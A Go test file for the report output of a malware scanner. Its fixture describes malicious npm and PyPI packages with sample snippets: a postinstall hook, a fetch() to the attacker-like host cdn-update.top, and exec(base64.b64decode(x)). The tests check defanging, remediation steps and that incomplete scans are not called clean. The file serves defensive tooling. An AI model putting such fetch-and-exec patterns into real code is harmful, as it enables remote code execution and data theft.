package report

import (
	"strings"
	"testing"
)

func malFixture() MalscanReport {
	return MalscanReport{
		FeedsEnabled: true, Indicators: 412118,
		Targets: []MalscanTarget{
			{Ecosystem: "npm", Label: "node_modules", Packages: 612, Files: 8210},
			{Ecosystem: "go", Label: "vendor", Packages: 401, Files: 9880},
			{Ecosystem: "python", Label: ".venv/lib/site-packages", Packages: 235, Files: 312},
		},
		Findings: []MalscanFinding{
			{Ecosystem: "npm", Package: "event-stream-helper", Location: "node_modules", Title: "runs code on install", RuleID: "R1",
				File: "node_modules/event-stream-helper/package.json", Line: 8, Snippet: `"postinstall": "node lib/setup.js"`, Severity: "critical", Class: "evidence"},
			{Ecosystem: "npm", Package: "event-stream-helper", Location: "node_modules", Title: "contacts a known-bad host", RuleID: "IOC-STIX-MATCH",
				File: "node_modules/event-stream-helper/lib/setup.js", Line: 41, Snippet: "fetch('https://cdn-update.top/s')", Severity: "critical", Class: "evidence",
				IOCType: "domain", IOCValue: "cdn-update.top"},
			{Ecosystem: "pypi", Package: "colorama-ext", Location: ".venv/lib/site-packages", Title: "base64 decoded into exec()", RuleID: "R2",
				File: ".venv/lib/site-packages/colorama-ext/setup.py", Line: 12, Snippet: "exec(base64.b64decode(x))", Severity: "medium", Class: "trigger"},
		},
	}
}

func TestGoldenMalscan(t *testing.T) {
	o := Options{Command: "malscan"}
	golden(t, "malscan_found_110", RenderMalscan(malFixture(), o, plainTerm(110, true)))
	golden(t, "malscan_found_50", RenderMalscan(malFixture(), o, plainTerm(50, true)))
	clean := malFixture()
	clean.Findings = nil
	golden(t, "malscan_clean_110", RenderMalscan(clean, o, plainTerm(110, true)))
	empty := MalscanReport{FeedsEnabled: true}
	golden(t, "malscan_incomplete_110", RenderMalscan(empty, o, plainTerm(110, true)))
	golden(t, "malscan_incomplete_50", RenderMalscan(empty, o, plainTerm(50, true)))
}

// A scan that looked at nothing, or had nothing to compare with, is never clean.
func TestMalscanNeverSaysCleanOverNothing(t *testing.T) {
	for name, m := range map[string]MalscanReport{
		"no targets":    {FeedsEnabled: true, Indicators: 100},
		"no indicators": {FeedsEnabled: true, Targets: []MalscanTarget{{Ecosystem: "npm", Label: "node_modules", Packages: 3, Files: 40}}},
		"empty dirs":    {FeedsEnabled: true, Indicators: 100, Targets: []MalscanTarget{{Ecosystem: "npm", Label: "node_modules"}}},
	} {
		out := RenderMalscan(m, Options{Command: "malscan"}, plainTerm(110, true))
		if !strings.Contains(out, "INCOMPLETE") || strings.Contains(out, "none found") {
			t.Errorf("%s must read INCOMPLETE:\n%s", name, out)
		}
		if !strings.Contains(out, "NOT CHECKED") {
			t.Errorf("%s must say what was not checked:\n%s", name, out)
		}
		if got := RenderMalscan(m, Options{Quiet: true}, plainTerm(110, true)); got == "" {
			t.Errorf("%s: -q must not go silent over an incomplete scan", name)
		}
	}
	// --no-ioc-feeds is a choice: zero indicators is then expected, not a gap.
	chosen := MalscanReport{FeedsEnabled: false, Targets: []MalscanTarget{{Ecosystem: "npm", Label: "node_modules", Packages: 3, Files: 40}}}
	if out := RenderMalscan(chosen, Options{}, plainTerm(110, true)); strings.Contains(out, "INCOMPLETE") {
		t.Errorf("a run without feeds by choice is not incomplete:\n%s", out)
	}
}

func TestMalscanGroupsByPackageAndDefangs(t *testing.T) {
	out := RenderMalscan(malFixture(), Options{Command: "malscan"}, plainTerm(110, true))
	for _, want := range []string{
		"MALWARE in 1 package", "1 malicious", "1 suspicious", "1,246 clean",
		"MALICIOUS", "SUSPICIOUS", "event-stream-helper", "colorama-ext",
		"cdn-update[.]top", "WHAT TO DO, IN THIS ORDER", "Rotate the credentials",
		"Search proxy and CI logs for cdn-update[.]top",
		"vulnetix malscan -o sarif", "vulnetix sca --block-malware", "vulnetix malscan --include-home",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	if strings.Contains(out, "cdn-update.top") {
		t.Errorf("an indicator must be defanged, never printed as a link:\n%s", out)
	}
	if n := strings.Count(out, "event-stream-helper"); n < 2 { // the row and the remove step
		t.Errorf("package should appear once as a row and in the steps, got %d", n)
	}
}

func TestMalscanVerboseShowsWarnings(t *testing.T) {
	m := malFixture()
	m.Warnings = []string{"iocscan(npm): feeds unavailable: offline"}
	if out := RenderMalscan(m, Options{}, plainTerm(110, true)); strings.Contains(out, "feeds unavailable") {
		t.Error("warnings belong to -v")
	}
	if out := RenderMalscan(m, Options{Verbosity: 1}, plainTerm(110, true)); !strings.Contains(out, "feeds unavailable") {
		t.Error("-v should list warnings")
	}
}

func TestGoldenBinaries(t *testing.T) {
	b := BinarySummary{Files: 1204, Rows: []BinaryRow{
		{Path: "dist/vulnetix_linux_amd64", Weaknesses: []string{"no-pie", "partial-relro"}},
		{Path: "dist/tools/legacy-helper", Weaknesses: []string{"nx-disabled", "no-stack-canary"}, Package: "legacy 1.2"},
		{Path: "usr/bin/ok", Weaknesses: nil},
		{Path: "usr/bin/su", Weaknesses: []string{"setuid", "no-relro"}},
	}, Errors: []string{"usr/lib/x.so: permission denied"}}
	golden(t, "binaries_110", RenderBinaries(b, Options{}, plainTerm(110, true)))
	golden(t, "binaries_50", RenderBinaries(b, Options{}, plainTerm(50, true)))
	if out := RenderBinaries(BinarySummary{Files: 9}, Options{}, plainTerm(110, true)); out != "" {
		t.Errorf("no ELF files, no section: %q", out)
	}
	clean := RenderBinaries(BinarySummary{Files: 9, Rows: []BinaryRow{{Path: "a"}}}, Options{}, plainTerm(110, true))
	if !strings.Contains(clean, "no hardening weaknesses found") {
		t.Errorf("a clean set should say so:\n%s", clean)
	}
}
